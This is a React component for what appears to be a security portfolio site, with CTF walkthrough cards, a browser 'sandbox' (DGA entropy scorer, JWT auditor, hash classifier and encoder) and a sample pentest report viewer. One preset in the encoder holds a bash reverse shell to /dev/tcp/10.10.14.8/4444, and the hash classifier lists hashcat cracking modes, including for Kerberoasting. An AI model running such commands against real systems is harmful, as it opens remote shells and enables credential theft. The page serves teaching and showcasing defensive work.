import { useMemo, useState } from 'react'
import {
  Terminal,
  ShieldAlert,
  ShieldCheck,
  ChevronRight,
  Copy,
  Check,
  Crosshair,
  Cpu,
  FileSpreadsheet,
  KeyRound,
  Activity,
  Hash,
  AlertTriangle,
  CheckCircle2,
} from 'lucide-react'
import {
  ctfWalkthroughs,
  samplePentestReport,
  type CtfWalkthrough,
  type PentestFinding,
} from '../data/profile'
import { TechBadgeIcon } from './BrandIcons'
import { Modal } from './Modal'
import { Reveal, Section } from './Section'

const categories = [
  'All',
  'Linux Privilege Escalation',
  'Web & API Security',
  'Active Directory Exploitation',
  'Network Defense & Threat Intel',
] as const

type WorkbenchTab = 'walkthroughs' | 'sandbox' | 'vapt-report'

// Shannon Entropy helper (same formula used in Giridharan's DNS-Sinkhole engine)
function computeDomainMetrics(rawInput: string) {
  const cleaned = rawInput
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, '')
    .split('/')[0]
    .split(':')[0]

  const parts = cleaned.split('.').filter(Boolean)
  const label = parts.length > 1 ? parts.slice(0, -1).join('') : cleaned
  if (!label) {
    return {
      cleaned: '',
      label: '',
      entropy: 0,
      length: 0,
      digitRatio: 0,
      verdict: 'SAFE' as const,
      reason: 'Enter a domain or hostname to calculate Shannon entropy.',
    }
  }

  const freq: Record<string, number> = {}
  for (const ch of label) {
    freq[ch] = (freq[ch] || 0) + 1
  }
  const len = label.length
  let entropy = 0
  for (const count of Object.values(freq)) {
    const p = count / len
    entropy -= p * Math.log2(p)
  }

  const digits = (label.match(/[0-9]/g) || []).length
  const digitRatio = Math.round((digits / len) * 100)
  const hasHomograph = /0|1|rn|vv|-auth|-verify|-secure/.test(cleaned)

  let verdict: 'SINKHOLE_BLOCK' | 'SUSPICIOUS' | 'ALLOW' = 'ALLOW'
  let reason = 'Normal lexical distribution — matches standard human-readable domain patterns.'

  if (entropy >= 3.75 || (entropy >= 3.45 && digitRatio >= 22)) {
    verdict = 'SINKHOLE_BLOCK'
    reason =
      'High randomness & alphanumeric mixing exceeds DGA threshold (H >= 3.75). Routed to 0.0.0.0 sinkhole.'
  } else if (hasHomograph || entropy >= 3.35) {
    verdict = 'SUSPICIOUS'
    reason =
      'Elevated entropy or deceptive phishing/homograph tokens detected. Flagged for Pishentry inspection.'
  }

  return {
    cleaned,
    label,
    entropy: Number(entropy.toFixed(3)),
    length: len,
    digitRatio,
    verdict,
    reason,
  }
}

// Hash classifier helper
function classifyHashOrPayload(input: string) {
  const s = input.trim()
  if (!s) return { type: 'Awaiting Input', hashcat: '—', notes: 'Paste a hash or string.' }
  if (s.startsWith('$krb5tgs$23$')) {
    return {
      type: 'Kerberos 5 TGS-REP etype 23 (Kerberoasting)',
      hashcat: 'hashcat -m 13100',
      notes: 'Active Directory RC4-HMAC service ticket hash.',
    }
  }
  if (s.startsWith('$2a$') || s.startsWith('$2b$') || s.startsWith('$2y$')) {
    return {
      type: 'bcrypt (Blowfish Adaptive Hash)',
      hashcat: 'hashcat -m 3200',
      notes: 'Salted slow password hash.',
    }
  }
  if (/^[a-fA-F0-9]{32}$/.test(s)) {
    return {
      type: 'MD5 / NTLM (128-bit Hex)',
      hashcat: 'hashcat -m 0 (MD5) / -m 1000 (NTLM)',
      notes: '32-char hexadecimal digest (used in Mr. Robot CTF & Windows SAM).',
    }
  }
  if (/^[a-fA-F0-9]{40}$/.test(s)) {
    return {
      type: 'SHA-1 (160-bit Hex)',
      hashcat: 'hashcat -m 100',
      notes: 'Legacy 40-char hexadecimal digest.',
    }
  }
  if (/^[a-fA-F0-9]{64}$/.test(s)) {
    return {
      type: 'SHA-256 (256-bit Hex)',
      hashcat: 'hashcat -m 1400',
      notes: '64-char cryptographic digest.',
    }
  }
  return {
    type: 'Plaintext / Custom Payload',
    hashcat: 'N/A (Use Base64 / Hex encoder below)',
    notes: `Length: ${s.length} chars`,
  }
}

const SAMPLE_JWT =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDA5OTkiLCJ1c2VyIjoiZ2lyaWRoYXJhbiIsInJvbGUiOiJyZWR0ZWFtX29wZXJhdG9yIiwic2NvcGUiOiJhcGk6cmVhZCBhcGk6d3JpdGUifQ.signature_demo_hmac_sha256'

export function Walkthroughs() {
  const [activeTab, setActiveTab] = useState<WorkbenchTab>('walkthroughs')
  const [filter, setFilter] = useState<(typeof categories)[number]>('All')
  const [selected, setSelected] = useState<CtfWalkthrough | null>(null)
  const [selectedFinding, setSelectedFinding] = useState<PentestFinding>(
    samplePentestReport.findings[0],
  )
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)

  // Live Cyber Sandbox states
  const [domainInput, setDomainInput] = useState('x9k2m8a1p0z9q4v.ru')
  const [jwtInput, setJwtInput] = useState(SAMPLE_JWT)
  const [payloadInput, setPayloadInput] = useState('c3fcd3d76192e4007dfb496cca67e13b')

  const domainStats = useMemo(() => computeDomainMetrics(domainInput), [domainInput])
  const hashInfo = useMemo(() => classifyHashOrPayload(payloadInput), [payloadInput])

  const jwtAudit = useMemo(() => {
    try {
      const parts = jwtInput.trim().split('.')
      if (parts.length < 2) {
        return { valid: false, header: null, payload: null, warnings: ['Invalid JWT format (expected header.payload.signature)'] }
      }
      const decodeB64 = (str: string) => {
        const base64 = str.replace(/-/g, '+').replace(/_/g, '/')
        const padded = base64 + '='.repeat((4 - (base64.length % 4)) % 4)
        return JSON.parse(atob(padded))
      }
      const header = decodeB64(parts[0])
      const payload = decodeB64(parts[1])
      const warnings: string[] = []

      if (!header.alg || String(header.alg).toLowerCase() === 'none') {
        warnings.push('CRITICAL: Algorithm set to "none" — signature verification bypassable.')
      } else if (header.alg === 'HS256') {
        warnings.push('AUDIT: Symmetric HS256 in use — verify secret entropy against offline Hashcat (-m 16500) brute-force.')
      }
      if (!payload.exp) {
        warnings.push('HIGH: Missing "exp" (Expiration) claim — token never expires unless revoked.')
      }
      if (payload.role || payload.admin || payload.is_admin) {
        warnings.push('INFO: Privileged role claim present in token — verify backend prevents BOLA/IDOR & privilege tampering.')
      }
      return { valid: true, header, payload, warnings }
    } catch {
      return {
        valid: false,
        header: null,
        payload: null,
        warnings: ['Could not decode Base64URL JSON segments. Check token formatting.'],
      }
    }
  }, [jwtInput])

  const encodedTransforms = useMemo(() => {
    const raw = payloadInput || ''
    let b64 = ''
    try {
      b64 = btoa(unescape(encodeURIComponent(raw)))
    } catch {
      b64 = '—'
    }
    const hex = Array.from(raw)
      .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
      .join('')
    return { b64, hex: hex || '—', url: encodeURIComponent(raw) }
  }, [payloadInput])

  const filtered =
    filter === 'All'
      ? ctfWalkthroughs
      : ctfWalkthroughs.filter((w) => w.category === filter)

  const copyCommand = (cmd: string) => {
    navigator.clipboard?.writeText(cmd)
    setCopiedCmd(cmd)
    setTimeout(() => setCopiedCmd(null), 1600)
  }

  return (
    <Section
      id="walkthroughs"
      index="04"
      label="CTF Walkthroughs, Live Cyber Sandbox & VAPT Report"
      title="Step-by-step offensive chains, live browser tools & pentest deliverables."
    >
      {/* Top 3-Mode Interactive Workbench Switcher */}
      <div className="mb-8 flex flex-col gap-3 rounded-2xl border border-line bg-surface p-2 sm:flex-row sm:flex-wrap sm:items-center sm:justify-between">
        <div className="flex flex-col gap-1.5 sm:flex-row sm:flex-wrap">
          <button
            onClick={() => setActiveTab('walkthroughs')}
            className={`inline-flex w-full items-center gap-2 rounded-xl px-4 py-2.5 text-left text-xs font-semibold transition sm:w-auto sm:justify-center ${
              activeTab === 'walkthroughs'
                ? 'bg-accent text-white shadow-sm shadow-accent/30'
                : 'text-chrome hover:bg-bg hover:text-ink'
            }`}
          >
            <Terminal className="h-3.5 w-3.5 shrink-0" />
            <span>1. CTF &amp; Lab Walkthroughs (4)</span>
          </button>

          <button
            onClick={() => setActiveTab('sandbox')}
            className={`inline-flex w-full items-center gap-2 rounded-xl px-4 py-2.5 text-left text-xs font-semibold transition sm:w-auto sm:justify-center ${
              activeTab === 'sandbox'
                ? 'bg-accent text-white shadow-sm shadow-accent/30'
                : 'text-chrome hover:bg-bg hover:text-ink'
            }`}
          >
            <Cpu className="h-3.5 w-3.5 shrink-0" />
            <span>2. Live Cyber Sandbox (Interactive)</span>
          </button>

          <button
            onClick={() => setActiveTab('vapt-report')}
            className={`inline-flex w-full items-center gap-2 rounded-xl px-4 py-2.5 text-left text-xs font-semibold transition sm:w-auto sm:justify-center ${
              activeTab === 'vapt-report'
                ? 'bg-accent text-white shadow-sm shadow-accent/30'
                : 'text-chrome hover:bg-bg hover:text-ink'
            }`}
          >
            <FileSpreadsheet className="h-3.5 w-3.5 shrink-0" />
            <span>3. Sample VAPT Executive Report (CVSS 3.1)</span>
          </button>
        </div>

        <span className="px-3 pb-1 font-mono text-[11px] text-faint sm:pb-0">
          {activeTab === 'walkthroughs' && 'MITRE ATT&CK Mapped'}
          {activeTab === 'sandbox' && 'Client-Side Zero-Latency Engine'}
          {activeTab === 'vapt-report' && `Report ID: ${samplePentestReport.reportId}`}
        </span>
      </div>

      {/* MODE 1: CTF & LAB WALKTHROUGHS */}
      {activeTab === 'walkthroughs' && (
        <>
          <div className="mb-8 flex flex-wrap items-center justify-between gap-4">
            <div className="flex flex-wrap gap-2">
              {categories.map((cat) => {
                const active = filter === cat
                return (
                  <button
                    key={cat}
                    onClick={() => setFilter(cat)}
                    className={`rounded-full px-3.5 py-1.5 text-xs font-medium transition sm:px-4 ${
                      active
                        ? 'bg-accent text-white shadow-sm shadow-accent/30'
                        : 'border border-line bg-surface text-chrome hover:border-chrome/50 hover:text-ink'
                    }`}
                  >
                    {cat}
                  </button>
                )
              })}
            </div>

            <span className="font-mono text-xs text-faint">
              Showing {filtered.length} of {ctfWalkthroughs.length} lab writeups
            </span>
          </div>

          <div className="grid gap-5 sm:gap-6 lg:grid-cols-2">
            {filtered.map((item, i) => (
              <Reveal
                key={item.id}
                delay={i * 0.06}
                className="group flex min-w-0 flex-col justify-between rounded-2xl border border-line bg-surface p-5 transition duration-300 hover:-translate-y-0.5 hover:border-accent/60 sm:p-7"
              >
                <div className="min-w-0">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex flex-wrap items-center gap-1.5 sm:gap-2">
                      <span className="inline-flex items-center gap-1.5 rounded-full border border-accent/40 bg-accent/10 px-2.5 py-0.5 font-mono text-[10px] font-medium text-accent sm:px-3 sm:text-[11px]">
                        <Crosshair className="h-3 w-3 shrink-0" />
                        <span>{item.category}</span>
                      </span>
                      <span className="rounded-full border border-chrome/25 bg-bg px-2.5 py-0.5 font-mono text-[10px] text-chrome sm:text-[11px]">
                        {item.platform}
                      </span>
                    </div>
                    <span className="font-mono text-[11px] text-faint sm:text-xs">
                      {item.difficulty} · {item.mitre}
                    </span>
                  </div>

                  <h3 className="mt-4 font-display text-lg font-semibold tracking-tight text-ink transition group-hover:text-accent sm:text-xl">
                    {item.title}
                  </h3>
                  <p className="mt-2.5 text-xs leading-relaxed text-chrome/90 sm:text-sm">{item.summary}</p>

                  <div className="mt-5 rounded-xl border border-line bg-bg p-3.5 sm:p-4">
                    <p className="font-mono text-[11px] uppercase tracking-widest text-faint">
                      Attack &amp; Analysis Chain ({item.steps.length} Stages)
                    </p>
                    <div className="mt-3 space-y-2.5">
                      {item.steps.slice(0, 2).map((s) => (
                        <div key={s.stage} className="min-w-0 text-xs">
                          <p className="font-mono font-semibold text-accent">{s.stage}</p>
                          <code className="mt-1 block truncate font-mono text-[11px] text-chrome/80">
                            {s.cmd.split('\n')[0]}
                          </code>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="mt-6 border-t border-line pt-4">
                  <div className="flex flex-wrap gap-1.5">
                    {item.tags.map((t) => (
                      <span
                        key={t}
                        className="inline-flex items-center gap-1 rounded-md border border-chrome/20 bg-bg px-2.5 py-1 font-mono text-[11px] text-chrome"
                      >
                        <TechBadgeIcon name={t} className="h-3 w-3 text-accent" />
                        {t}
                      </span>
                    ))}
                  </div>

                  <div className="mt-4 flex flex-wrap items-center justify-between gap-2">
                    <button
                      onClick={() => setSelected(item)}
                      className="inline-flex items-center gap-1.5 text-xs font-semibold text-accent transition hover:text-accent-soft"
                    >
                      <Terminal className="h-3.5 w-3.5 shrink-0" />
                      <span>Inspect Full Attack Chain &amp; Fix</span>
                      <ChevronRight className="h-3.5 w-3.5 shrink-0" />
                    </button>
                    <span className="font-mono text-[11px] text-faint">MITRE {item.mitre}</span>
                  </div>
                </div>
              </Reveal>
            ))}
          </div>
        </>
      )}

      {/* MODE 2: INTERACTIVE LIVE CYBER SANDBOX */}
      {activeTab === 'sandbox' && (
        <div className="grid gap-5 sm:gap-6 lg:grid-cols-12">
          {/* Sandbox Tool 1: Live DGA Shannon Entropy Scanner */}
          <div className="min-w-0 rounded-2xl border border-line bg-surface p-5 sm:p-7 lg:col-span-6">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <span className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-widest text-accent">
                <Activity className="h-4 w-4 shrink-0" />
                <span>DNS-Sinkhole Engine · Live DGA Entropy Scanner</span>
              </span>
              <span className="rounded-full border border-chrome/25 bg-bg px-2.5 py-0.5 font-mono text-[10px] text-chrome">
                Shannon H(X)
              </span>
            </div>

            <p className="mt-2 text-xs leading-relaxed text-chrome/85">
              Test the exact mathematical heuristic from my <strong>DNS-Sinkhole</strong> project. Type any domain or click a preset below to score its Shannon entropy in real time.
            </p>

            <div className="mt-4">
              <label className="block font-mono text-[11px] uppercase tracking-wider text-faint">
                Target Domain / Query
              </label>
              <input
                type="text"
                value={domainInput}
                onChange={(e) => setDomainInput(e.target.value)}
                placeholder="e.g. x9k2m8a1p0z9q4v.ru"
                className="mt-1.5 w-full rounded-xl border border-line bg-bg px-3.5 py-2.5 font-mono text-xs text-ink focus:border-accent focus:outline-none sm:px-4 sm:text-sm"
              />
              <div className="mt-2 flex flex-wrap gap-1.5">
                {[
                  { label: 'DGA Botnet', val: 'x9k2m8a1p0z9q4v.ru' },
                  { label: 'Phishing Homograph', val: 'micros0ft-auth-verify.com' },
                  { label: 'Legit Domain', val: 'tryhackme.com' },
                ].map((preset) => (
                  <button
                    key={preset.label}
                    onClick={() => setDomainInput(preset.val)}
                    className="rounded-lg border border-line bg-bg px-2.5 py-1 text-left font-mono text-[10px] text-chrome transition hover:border-accent hover:text-ink sm:text-[11px]"
                  >
                    {preset.label}: {preset.val}
                  </button>
                ))}
              </div>
            </div>

            <div className="mt-5 rounded-xl border border-line bg-bg p-3.5 sm:p-4">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div>
                  <p className="font-mono text-[10px] text-faint sm:text-[11px]">SHANNON ENTROPY SCORE</p>
                  <p className="mt-0.5 font-display text-2xl font-bold text-ink sm:text-3xl">
                    {domainStats.entropy} <span className="font-mono text-xs text-faint">bits/char</span>
                  </p>
                </div>

                <span
                  className={`rounded-full px-3 py-1 font-mono text-[11px] font-semibold sm:text-xs ${
                    domainStats.verdict === 'SINKHOLE_BLOCK'
                      ? 'border border-accent bg-accent/15 text-accent'
                      : domainStats.verdict === 'SUSPICIOUS'
                        ? 'border border-chrome bg-chrome/10 text-ink'
                        : 'border border-chrome/30 bg-surface text-chrome'
                  }`}
                >
                  {domainStats.verdict === 'SINKHOLE_BLOCK'
                    ? 'BLOCKED → 0.0.0.0'
                    : domainStats.verdict === 'SUSPICIOUS'
                      ? 'SUSPICIOUS IOC'
                      : 'CLEAN / ALLOW'}
                </span>
              </div>

              <div className="mt-4 grid grid-cols-3 gap-2 border-t border-line pt-3 font-mono text-xs">
                <div className="min-w-0">
                  <span className="block truncate text-[10px] text-faint">LABEL LEN</span>
                  <p className="text-ink">{domainStats.length} chars</p>
                </div>
                <div className="min-w-0">
                  <span className="block truncate text-[10px] text-faint">DIGITS</span>
                  <p className="text-ink">{domainStats.digitRatio}%</p>
                </div>
                <div className="min-w-0">
                  <span className="block truncate text-[10px] text-faint">THRESHOLD</span>
                  <p className="text-accent">H &ge; 3.75</p>
                </div>
              </div>

              <p className="mt-3 text-xs leading-relaxed text-chrome/85">{domainStats.reason}</p>
            </div>
          </div>

          {/* Sandbox Tool 2: JWT Token Security Auditor */}
          <div className="min-w-0 rounded-2xl border border-line bg-surface p-5 sm:p-7 lg:col-span-6">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <span className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-widest text-accent">
                <KeyRound className="h-4 w-4 shrink-0" />
                <span>AppSec Lab · JWT Token Decoder &amp; Auditor</span>
              </span>
              <span className="rounded-full border border-chrome/25 bg-bg px-2.5 py-0.5 font-mono text-[10px] text-chrome">
                OWASP API2
              </span>
            </div>

            <p className="mt-2 text-xs leading-relaxed text-chrome/85">
              Paste any JWT to decode its Base64URL header &amp; claims in your browser and inspect for algorithm confusion, missing expiration, or privilege claims.
            </p>

            <textarea
              rows={2}
              value={jwtInput}
              onChange={(e) => setJwtInput(e.target.value)}
              className="mt-4 w-full rounded-xl border border-line bg-bg p-3 font-mono text-xs text-chrome focus:border-accent focus:outline-none"
            />

            <div className="mt-3 grid gap-3 sm:grid-cols-2">
              <div className="min-w-0 rounded-xl border border-line bg-bg p-3">
                <p className="font-mono text-[10px] uppercase tracking-widest text-faint">
                  Decoded Header
                </p>
                <pre className="mt-1.5 overflow-x-auto whitespace-pre-wrap break-all font-mono text-[11px] text-chrome">
                  {jwtAudit.header ? JSON.stringify(jwtAudit.header, null, 2) : 'Invalid Header'}
                </pre>
              </div>
              <div className="min-w-0 rounded-xl border border-line bg-bg p-3">
                <p className="font-mono text-[10px] uppercase tracking-widest text-faint">
                  Decoded Claims Payload
                </p>
                <pre className="mt-1.5 overflow-x-auto whitespace-pre-wrap break-all font-mono text-[11px] text-chrome">
                  {jwtAudit.payload ? JSON.stringify(jwtAudit.payload, null, 2) : 'Invalid Payload'}
                </pre>
              </div>
            </div>

            <div className="mt-3 space-y-1.5">
              {jwtAudit.warnings.map((w) => (
                <div
                  key={w}
                  className="flex items-start gap-2 rounded-lg border border-accent/35 bg-accent/10 px-3 py-2 text-xs text-ink"
                >
                  <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0 text-accent" />
                  <span>{w}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Sandbox Tool 3: Hash Classifier & Payload Encoder */}
          <div className="min-w-0 rounded-2xl border border-line bg-surface p-5 sm:p-7 lg:col-span-12">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <span className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-widest text-accent">
                <Hash className="h-4 w-4 shrink-0" />
                <span>Red Team Utility · Hash Classifier &amp; Payload Encoder</span>
              </span>
              <div className="flex flex-wrap gap-1.5">
                {[
                  { label: 'MD5 Sample', val: 'c3fcd3d76192e4007dfb496cca67e13b' },
                  { label: 'Kerberoast TGS', val: '$krb5tgs$23$*mssql_svc$CORP.LOCAL$8f2a9c...' },
                  { label: 'Reverse Shell Cmd', val: 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' },
                ].map((p) => (
                  <button
                    key={p.label}
                    onClick={() => setPayloadInput(p.val)}
                    className="rounded-lg border border-line bg-bg px-2.5 py-1 font-mono text-[11px] text-chrome transition hover:border-accent hover:text-ink"
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="mt-4 grid gap-4 lg:grid-cols-3">
              <div className="min-w-0 lg:col-span-1">
                <label className="block font-mono text-[11px] uppercase tracking-wider text-faint">
                  Input Hash or Payload
                </label>
                <input
                  type="text"
                  value={payloadInput}
                  onChange={(e) => setPayloadInput(e.target.value)}
                  className="mt-1.5 w-full rounded-xl border border-line bg-bg px-3.5 py-2.5 font-mono text-xs text-ink focus:border-accent focus:outline-none sm:px-4"
                />
                <div className="mt-3 rounded-xl border border-line bg-bg p-3.5">
                  <p className="font-mono text-[10px] uppercase tracking-widest text-faint">
                    Detected Format
                  </p>
                  <p className="mt-1 font-display text-sm font-semibold text-ink">{hashInfo.type}</p>
                  <p className="mt-1 font-mono text-xs text-accent">{hashInfo.hashcat}</p>
                  <p className="mt-1 text-[11px] text-chrome/80">{hashInfo.notes}</p>
                </div>
              </div>

              <div className="grid gap-3 sm:grid-cols-3 lg:col-span-2">
                {[
                  { label: 'Base64 Encoded', value: encodedTransforms.b64 },
                  { label: 'Hexadecimal', value: encodedTransforms.hex },
                  { label: 'URL Encoded', value: encodedTransforms.url },
                ].map((enc) => (
                  <div
                    key={enc.label}
                    className="flex min-w-0 flex-col justify-between rounded-xl border border-line bg-bg p-3.5"
                  >
                    <div>
                      <div className="flex items-center justify-between">
                        <span className="font-mono text-[10px] uppercase tracking-widest text-faint">
                          {enc.label}
                        </span>
                        <button
                          onClick={() => copyCommand(enc.value)}
                          className="font-mono text-[10px] text-accent hover:underline"
                        >
                          {copiedCmd === enc.value ? 'Copied' : 'Copy'}
                        </button>
                      </div>
                      <p className="mt-2 break-all font-mono text-xs text-chrome">{enc.value}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* MODE 3: SAMPLE PENTEST / VAPT EXECUTIVE REPORT VIEWER */}
      {activeTab === 'vapt-report' && (
        <div className="rounded-2xl border border-line bg-surface p-5 sm:p-7 md:p-9">
          {/* Report Header */}
          <div className="flex flex-wrap items-start justify-between gap-4 border-b border-line pb-6">
            <div className="min-w-0">
              <div className="flex flex-wrap items-center gap-2">
                <span className="rounded-full border border-accent/40 bg-accent/15 px-3 py-0.5 font-mono text-[11px] font-semibold text-accent sm:text-xs">
                  SAMPLE RED TEAM DELIVERABLE
                </span>
                <span className="rounded-full border border-chrome/25 bg-bg px-3 py-0.5 font-mono text-[11px] text-chrome sm:text-xs">
                  {samplePentestReport.reportId}
                </span>
              </div>
              <h3 className="mt-3 font-display text-xl font-bold text-ink sm:text-2xl md:text-3xl">
                {samplePentestReport.title}
              </h3>
              <p className="mt-1 font-mono text-xs leading-relaxed text-chrome/80">
                Lead Auditor: {samplePentestReport.leadAuditor} · Methodology:{' '}
                {samplePentestReport.methodology}
              </p>
            </div>

            <button
              onClick={() => window.print()}
              className="inline-flex w-full items-center justify-center gap-2 rounded-full border border-chrome/30 bg-bg px-4 py-2.5 text-xs font-semibold text-chrome transition hover:border-accent hover:text-ink sm:w-auto"
            >
              <FileSpreadsheet className="h-3.5 w-3.5 text-accent" />
              Print / Save VAPT Report
            </button>
          </div>

          {/* Executive Summary + Severity Counters */}
          <div className="mt-6 grid gap-6 lg:grid-cols-12">
            <div className="min-w-0 lg:col-span-7">
              <p className="font-mono text-xs uppercase tracking-widest text-accent">
                01 / Executive Summary
              </p>
              <p className="mt-2 text-xs leading-relaxed text-chrome/90 sm:text-sm">
                {samplePentestReport.executiveSummary}
              </p>
            </div>

            <div className="grid grid-cols-2 gap-3 sm:grid-cols-4 lg:col-span-5">
              {samplePentestReport.metrics.map((m) => (
                <div
                  key={m.label}
                  className="rounded-xl border border-line bg-bg p-3 text-center sm:p-3.5"
                >
                  <p className="font-display text-xl font-bold text-accent sm:text-2xl">{m.count}</p>
                  <p className="mt-1 font-mono text-[10px] text-chrome/80">{m.label}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Interactive Finding Selector + Detailed CVSS 3.1 Finding View */}
          <div className="mt-8 grid gap-6 lg:grid-cols-12">
            <div className="min-w-0 space-y-2.5 lg:col-span-5">
              <p className="font-mono text-xs uppercase tracking-widest text-faint">
                02 / Technical Findings (Select to Inspect)
              </p>
              {samplePentestReport.findings.map((f) => {
                const active = selectedFinding.id === f.id
                return (
                  <button
                    key={f.id}
                    onClick={() => setSelectedFinding(f)}
                    className={`w-full rounded-xl border p-3.5 text-left transition sm:p-4 ${
                      active
                        ? 'border-accent bg-bg shadow-sm shadow-accent/20'
                        : 'border-line bg-bg/60 hover:border-chrome/40'
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="font-mono text-xs font-bold text-accent">
                        {f.id} · CVSS {f.cvss} ({f.severity})
                      </span>
                      <span className="font-mono text-[10px] text-faint">{f.cwe.split(' ')[0]}</span>
                    </div>
                    <p className="mt-1.5 font-display text-sm font-semibold text-ink">{f.title}</p>
                    <p className="mt-1 truncate font-mono text-[11px] text-chrome/70">
                      {f.endpoint}
                    </p>
                  </button>
                )
              })}
            </div>

            <div className="min-w-0 rounded-2xl border border-line bg-bg p-4 sm:p-6 lg:col-span-7">
              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line pb-4">
                <div className="min-w-0">
                  <span className="font-mono text-xs font-semibold text-accent">
                    {selectedFinding.id} · {selectedFinding.cwe}
                  </span>
                  <h4 className="mt-1 font-display text-lg font-bold text-ink sm:text-xl">
                    {selectedFinding.title}
                  </h4>
                </div>
                <span className="rounded-full border border-accent bg-accent/15 px-3 py-1 font-mono text-xs font-bold text-accent">
                  CVSS v3.1: {selectedFinding.cvss} ({selectedFinding.severity})
                </span>
              </div>

              <div className="mt-4 space-y-4 text-xs">
                <div>
                  <span className="font-mono text-[10px] uppercase tracking-widest text-faint">
                    Affected Asset &amp; CVSS Vector
                  </span>
                  <p className="mt-1 break-all font-mono text-chrome sm:break-words">
                    {selectedFinding.endpoint} · <span className="text-faint">{selectedFinding.vector}</span>
                  </p>
                </div>

                <div>
                  <span className="font-mono text-[10px] uppercase tracking-widest text-faint">
                    Business &amp; Technical Impact
                  </span>
                  <p className="mt-1 leading-relaxed text-chrome/90">{selectedFinding.impact}</p>
                </div>

                <div>
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-[10px] uppercase tracking-widest text-accent">
                      Proof of Concept (Sanitized Evidence)
                    </span>
                    <button
                      onClick={() => copyCommand(selectedFinding.poc)}
                      className="font-mono text-[10px] text-chrome hover:text-accent"
                    >
                      {copiedCmd === selectedFinding.poc ? '✓ Copied' : 'Copy PoC'}
                    </button>
                  </div>
                  <pre className="mt-1.5 overflow-x-auto whitespace-pre-wrap break-words rounded-xl border border-line bg-surface p-3 font-mono text-[10px] leading-relaxed text-chrome sm:p-3.5 sm:text-[11px]">
                    <code>{selectedFinding.poc}</code>
                  </pre>
                </div>

                <div className="rounded-xl border border-accent/40 bg-accent/10 p-3.5 sm:p-4">
                  <div className="flex items-center gap-2 font-mono text-xs font-semibold uppercase tracking-widest text-accent">
                    <CheckCircle2 className="h-4 w-4 shrink-0" />
                    <span>Recommended Remediation</span>
                  </div>
                  <p className="mt-1.5 leading-relaxed text-ink">{selectedFinding.remediation}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Interactive Step-by-Step Walkthrough Modal */}
      <Modal open={!!selected} onClose={() => setSelected(null)} wide>
        {selected && (
          <div className="space-y-6 p-5 sm:p-7 md:p-8">
            <div className="pr-8">
              <div className="flex flex-wrap items-center gap-2">
                <span className="rounded-full border border-accent/40 bg-accent/10 px-3 py-0.5 font-mono text-xs text-accent">
                  {selected.category}
                </span>
                <span className="rounded-full border border-chrome/30 bg-bg px-3 py-0.5 font-mono text-xs text-chrome">
                  {selected.platform}
                </span>
                <span className="rounded-full border border-line bg-bg px-3 py-0.5 font-mono text-xs text-faint">
                  {selected.difficulty} · MITRE {selected.mitre}
                </span>
              </div>

              <h3 className="mt-4 font-display text-xl font-bold text-ink sm:text-2xl">{selected.title}</h3>
              <p className="mt-2 text-xs leading-relaxed text-chrome sm:text-sm">{selected.summary}</p>
            </div>

            <div className="space-y-4">
              <h4 className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-widest text-accent">
                <ShieldAlert className="h-4 w-4" />
                <span>Step-by-Step Execution Log</span>
              </h4>

              {selected.steps.map((step) => (
                <div key={step.stage} className="rounded-xl border border-line bg-bg p-3.5 sm:p-4">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <p className="font-display text-sm font-semibold text-ink">{step.stage}</p>
                    <button
                      onClick={() => copyCommand(step.cmd)}
                      className="inline-flex items-center gap-1 rounded border border-line bg-surface px-2 py-1 font-mono text-[10px] text-chrome transition hover:border-accent hover:text-ink"
                    >
                      {copiedCmd === step.cmd ? (
                        <>
                          <Check className="h-3 w-3 text-accent" /> Copied
                        </>
                      ) : (
                        <>
                          <Copy className="h-3 w-3 text-accent" /> Copy Cmd
                        </>
                      )}
                    </button>
                  </div>

                  <pre className="mt-2.5 overflow-x-auto whitespace-pre-wrap break-words rounded-lg border border-line bg-surface p-3 font-mono text-[11px] text-chrome sm:text-xs">
                    <code>{step.cmd}</code>
                  </pre>

                  <p className="mt-2.5 text-xs leading-relaxed text-chrome/85">{step.detail}</p>
                </div>
              ))}
            </div>

            <div className="rounded-xl border border-accent/40 bg-accent/10 p-4">
              <div className="flex items-center gap-2 font-mono text-xs font-semibold uppercase tracking-widest text-accent">
                <ShieldCheck className="h-4 w-4" />
                <span>Blue Team Remediation &amp; Hardening</span>
              </div>
              <p className="mt-2 text-xs leading-relaxed text-ink">{selected.remediation}</p>
            </div>
          </div>
        )}
      </Modal>
    </Section>
  )
}
